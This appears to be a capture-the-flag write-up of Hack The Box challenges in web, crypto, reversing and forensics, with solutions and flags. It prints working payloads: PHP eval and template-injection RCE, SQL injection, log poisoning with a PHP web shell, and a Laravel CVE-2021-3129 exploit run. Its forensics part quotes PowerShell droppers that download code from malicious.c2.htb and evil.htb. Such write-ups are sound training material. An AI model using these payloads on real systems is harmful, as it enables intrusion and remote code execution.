<h1 align="center">WEB</h1>



### SimPlay

in */models/TimeModel.php* we see that the *getTime()* function is running an *eval()* command. If we follow that function back we see its input comes from */controllers/TimeController.php* and that it is user controlled via the *?format=* parameter, and the output of this function is being displayed on the webpage.

We can gain RCE using something like this

​	?format=${print(\`id\`)}

from the *entrypoint.sh* script we see the location of the flag is */flag$FLAG*
so we can get it's contents with

​	?format=${print(\`cat /flag*\`)}

Flag: HTB{3v4l_h4s_put_y0ur_3v1l_pl4ns_und3r!}

### Potent Quotes

we can see in database.js the code to login is vulnerable to SQL injection

```javascript
let query = `SELECT username FROM users WHERE username = '${user}' and password = '${pass}'`;
```

so we can login with password 

​	blah' OR 1=1-- -

Flag: HTB{sql_injecting_my_way_in}

### BoneChewerCon

looking at webpage we see the *?name=* parameter value is used on the page. Looking at source we see a  *\<!-- /debug -->* comment, so we test */debug* and see it displays the source for the page, which is a flask app and is vulnerable to template injection, we can use

​	?name={{config.items()}}

to get the flag.

Flag: HTB{r3s3rv4t1on_t0_h311_1s_a11_s3t!}

### IMF - Landing

we see the website seems to be loading the *home.php* and *agents.php* pages via the *?page=* parameter which suggests a potential PHP include vulnerability. We test for LFI with *?page=../../../../../etc/passwd* and it works.

Testing out various wrappers we find that *php://filter* works as well, and if we request the *index.php* file

​	?page=php://filter/convert.base64-encode/resource=index.php

and decode the resulting base64 we see

```php
<?php
if ($_GET['page']) {
    include($_GET['page']);
} else {
    header("Location: /?page=home.php");
```


which confirms our theory. Now we just need a way to get some malicious PHP onto the server to execute. Fuzzing for various files we find the *access.log* file at */var/log/nginx/access.log*

This file records the user-agent and referrer headers. So now we have our method to get malicious code on the server. We simply make a request with the header

​	User-Agent: \<?php system($_GET['cmd']); ?>

which will then be placed in the access.log file and ran when we hit it with the LFI

​	/?page=/var/log/nginx/access.log&cmd=ls

we can then enumerate the file system and find the flag one directory up

​	/?page=/var/log/nginx/access.log&cmd=cat ../flag1lVJu

Flag: HTB{m1ss10n_4c0mpl1sh3d}

### IMF - The Search

examining the source code we see the app is using pug for templating and in the */routs/default.route.js* file the following function

```javascript
defaultRoutes.route('/').post( (req, res) => {
    let name = req.body.name;
    let search = name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    if (typeof name !== 'undefined' && name != "") {
        query = { name : {$regex: search, $options: "i"} };
        Agent.find(query,  (err, agents) => {
            if (err) {
                console.log(err);
                return res.json(err);
            } else {
                return res.render('index', { agents: agents, name: pug.render(`| ${name}`) });
            }
        });
    } else {
        return res.redirect('/');
    }
});
```

which controls how a post request is handled, directly renders our unsanitized input (the filter in place is only for the db query).

we can enter *#{7+7}* to test and see it displays 14. So now we simply need to access the node process and we can get RCE. We display the flag by posting the following

​	#{process.mainModule.require('child_process').execSync('cat /flag*')}


Flag: HTB{SST1_by_f0rc3}

### Userland City 

The provided information informs us that the server is running laravel in debug more, we can send an unsupported http method to an endpoint to test this. If we send a POST request to / it will give us laravels debug interface, where we can get the version information. We see it is running laravel 8.10.0 and php 7.4.12.

If we google "laravel 8.10.0 exploit" we will be greeted with a bunch of information about [CVE-2021-3129](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3129) along with a bunch of automated scripts to exploit it.

If we use this [script](https://github.com/ambionics/laravel-exploits) along with [phpggc](https://github.com/ambionics/phpggc) and follow the instructions provided by the script by entering the following commands we get RCE. 

```bash
┌──(hilbert㉿kali)-[~/CTFs/Synack/Web/UserlandCity]
└─$ php -d'phar.readonly=0' ./phpggc/phpggc --phar phar -f -o /tmp/exploit.phar monolog/rce1 system id
┌──(hilbert㉿kali)-[~/CTFs/Synack/Web/UserlandCity]
└─$ /laravel-ignition-rce.py http://178.62.19.68:31142/ /tmp/exploit.phar
+ Log file: /www/storage/logs/laravel.log 
+ Logs cleared
+ Successfully converted to PHAR 
+ Phar deserialized
--------------------------
uid=1000(www) gid=1000(www) groups=1000(www)
--------------------------
+ Logs cleared
```

We can enumerate the file system and see the flag is in the root directory. For some reason I couldn't cat it with the exploit even tho I could cat other files. If we use ngrok tho and pop a shell then we can cat it fine                             

Flag: HTB{p0p..p0p..p0p..th0s3_ch41ns_0n_th3_w4y_t0_pr1s0n}

if you want to read more about the exploit and how it works or to do it manually you can read [here](https://www.ambionics.io/blog/laravel-debug-rce)



<h1 align="center">Crypto</h1>



### Spy

Examining the source code we see that they keys are being generated like so

```python
def keygen():
    random.seed(BYTE_SIZE)
    h = random.getrandbits(BIT_SIZE)
    for i in range(BIT_SIZE):
        random.seed(time.time())
        h = h ^ random.getrandbits(2*BIT_SIZE//BYTE_SIZE)
    return hex(h)[2:-1]
```

Since we have the seed, we can get the initial value of *h*. This key is 256 bits long, but if we look at the for loop that is presumably meant to make the key random, we see it is only changing the last 16 bits of h. This is easily in the realm of brute forcibility, even with the fact two keys and so are being used as this is only a search space of 2^(32). So we can simply decrypt the encrypted flag with every possible combination of keys until we get a byte string that looks like *HTB{wordswordswords}*.

The other method and the one which was intended is by using a "meet in the middle" attack. We can reasonable assume what a block of plaintext looks like given the format of all the provided message. We can then encrypt that block with every possible key and store the results. Then we can start from the other end since we have the corresponding ciphertext and we can decrypt a block and check if matches one of the blocks we've encrypted. If so then we have both keys. Worst case here is searching 2^(17) so this is considerably fast than the brute force approach.

One important thing not is that the *challenge.py* script is written in python2, so we need to make sure to use that when we get the value of h, as the value will be different in python3 as the *random.seed()* function is different.

Flag: HTB{_B4D_EncryPt!on_M1tM_4tt4ck_}

### Leakeyd

We can easily find phi(n) if we have *e* and *d*, since *ed = 1 + k(phi(n))* for some integer *k* via the definition of modular arithametic and since *phi(n)* is approximately the size of *n* we can just round *k = ed / n* and then we have *phi(n)*. Which is all that is needed to recover a corresponding private key.

Flag: HTB{tw4s_4-b3d_1d34_t0_us3-th4t_m0dulu5_4g41n-w45nt_1t...}

### Suspicious Signing

The server is using ECDSA to sign messages. If two different messages are ever signed with the same nonce then recovery of the private key is trivial. If we examine the signing function

```python
def ecdsa_sign(msg, privkey):
    hsh = md5(msg).digest()
    nonce = md5(hsh + long_to_bytes(privkey.secret_multiplier)).digest() * 2
    sig = privkey.sign(bytes_to_long(msg), bytes_to_long(nonce))
    return msg, sig.r, sig.s
```

we see that the nonce is a hash of the message concatenated with the private key. Since the private key is unchanging and we control the value of the message, if we can find an md5 collision, we will have identical nonces for two different messages. Simple google search will turn up a ton of such values. We then can solve a simple equation to get the private key, which we can then use to decrypt the encrypted flag.

Flag: HTB{r3u53d_n0nc35?n4h-w3_g0t_d3t3rm1n15t1c-n0nc3s!}

### Weak RSA

We can read the *pubkey.pem* file with

```
openssl rsa -pubin -in pubkey.pem -noout -text -modulus
```

to get the values for *(N,e)*. If we check [factordb](www.factordb.com) we will see N has been previously factored so we can recover the private key. We could also just run it through [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool) 



<h1 align="center">Reversing</h1>

### Check

We get an executable that asks us to enter in a secret passphrase, we can simply run *ltrace* on it and see its doing a 

 ```
 strcmp("ch3ck_anD_r3checK_aga1n!", "hilbert")
 ```

on our input. So that is the secret passphrase we need to enter

Flag: HTB{ch3ck_anD_r3checK_aga1n!}



<h1 align="center">Pwn</h1>

I suck at pwn :(



<h1 align="center">Forensics</h1>

## Sneaky

load pcap file with wireshark and follow TCP stream, we see its of web page with a login, and the username:password is captured 

```
username=Administrator&password=not_an_easy_password_to_guess&sub=LoginHTTP/1.1 302 Found
```

Flag: HTB{not_an_easy_password_to_guess}

### Top Secret

Another pcap capture, this time of a FTP download of a PDF file. We simply select folow TCP Stream in wireshark until we get to the PDF file, then we change the output to raw, save it as top_secret.pdf (doesnt matter what you name it), then from command line run '*md5sum topsecret.pdf*' and put the hash in the flag format

Flag: HTB{6ff7fa6c9aeee44c1aca5db8cf6278cb}

### EnduranceRun

Running *file* on the provided NTUSER.DAT file we see it is

```
NTUSER.DAT: MS Windows registry file, NT/2000 or above
```

Using a registry explorer program to open the file we can search for 'HTB', this will locate this value entry

```
%TEMP:~-8,1%md /C"set ltS=S_a1w@&&set AQ8f=le %TE&&set nP=%/a.exe&&set W5vl=00k};&&set azS=k3y_i&&set Nime=ys&&set ei=shell&&set CJO=power&&set qg=_4_g0o&&set qh7P=MP&&set txfY=%TEMP%/a.exe&&set iQ= -c 'wget http://mal&&set rZM=icious.c2.h&&set SlZ= &&set 0PU='; SET flag=HTB{rUn_Run_ruN_&&set eoOa=D_plac3_2_l&&set R3=tb/stage2 -outfi&&call set xg=%CJO%%ei%%iQ%%rZM%%R3%%AQ8f%%qh7P%%nP%%0PU%%azS%%ltS%%Nime%%qg%%eoOa%%W5vl%%SlZ%%txfY%&&call echo %xg%"|cmd
```


If we focus on this part

```
xg=%CJO%%ei%%iQ%%rZM%%R3%%AQ8f%%qh7P%%nP%%0PU%%azS%%ltS%%Nime%%qg%%eoOa%%W5vl%%SlZ%%txfY%&&call echo %xg%
```

and go through and recombine each piece in the order given, CJO || ei || iQ ... etc, etc we will get the following

```
powershell -c 'wget http://malicious.c2.htb/stage2 -outfile %TEMP%/a.exe'; SET flag=HTB{rUn_Run_ruN_k3y_iS_a1w@ys_4_g0oD_plac3_2_l00k}; ...
```

Flag: HTB{rUn_Run_ruN_k3y_iS_a1w@ys_4_g0oD_plac3_2_l00k}

### PhishinImpossible

if we use

    pdf-parser PhishinImpossible.pdf -f | grep HTB

we get this 

```
b'Settings>\n  <SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">\n    <ApplicationInformation>\n      <AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>\n      <DeepLink
>%windir%\\system32\\cmd.exe /c pow^ers^He^l^l.exe -nO^p -w hid^den -c $I=new-object net.webclient;$flag="HTB{th1s_m3";$I.proxy=[Net.Webrequest]::GetSystemWebProxy();$flag=$flag+"sS@gE_w1ll_s3lf";$I.Proxy.Credentials=[Net.CredentialsCache]::DefaultCred
entials;$flag=$flag+"_d3StRuC7}";IEX $.downloadstring(\'http://evil.htb/home\');</DeepLink>\n      <Icon>%windir%\\system32\\control.exe</Icon>\n    </ApplicationInformation>\n    <SettingIdentity>\n      <PageID></PageID>\n      <HostID>{12B1697E-D3A0
-4DBC-B568-CCF64A3F934D}</HostID>\n    </SettingIdentity>\n    <SettingInformation>\n      <Description>@shell32.dll,-4161</Description>\n      <Keywords>@shell32.dll,-4161</Keywords>\n    </SettingInformation>\n  </SearchableContent>\n</PCSettings>\n'
```

which we can visually scan and concatenate the flag parts into the whole flag

Flag: HTB{th1s_m3sS@gE_w1ll_s3lf_d3StRuC7}



<h1 align="center">Misc</h1>

### Blobber

We simply need to run the javascript and it will create a pdf which displays the password. 

Flag: HTB{l00k_cL0s3r_y0u_m1gHt_f1nd_0bfUsc4t10n_in_pl41n_sIgHT}

### ConText

If we stick the provided JS in a deobfuscator we can examine what is going on. If you try and run this it will just hang, but if we look at it the most obviously intesting function is the flag function. It isn't being called and it looks like it is rendering some kind of image, we have a large array of numbers and width and height variables and some image calls. If we make the reasonable assumption that the input to this function is an element in our document we want this image to appear in (if we use the initial array of strings and fill in where they belong, this becomes the obvious role of the input parameter). So we create a canvas element in HTML and then run the flag function passing in the id of that element and the flag is graphically rendered

Flag: HTB{m4st3r_0f_d3ObFuSc4T1oN}